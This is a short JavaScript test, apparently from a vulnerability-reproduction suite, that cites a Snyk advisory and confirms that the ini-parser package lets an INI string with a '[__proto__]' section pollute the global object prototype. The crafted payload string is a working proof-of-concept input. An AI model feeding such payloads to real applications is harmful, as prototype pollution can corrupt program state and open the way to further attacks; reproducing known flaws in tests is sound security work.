// https://snyk.io/vuln/SNYK-JS-INIPARSER-564122
test("prototype pollution in ini-parser", () => {
  expect({}.polluted).toBe(undefined);

  let a = require("ini-parser");
  a.parse("[__proto__]\npolluted=yes");

  expect({}.polluted).toBe("yes");
});
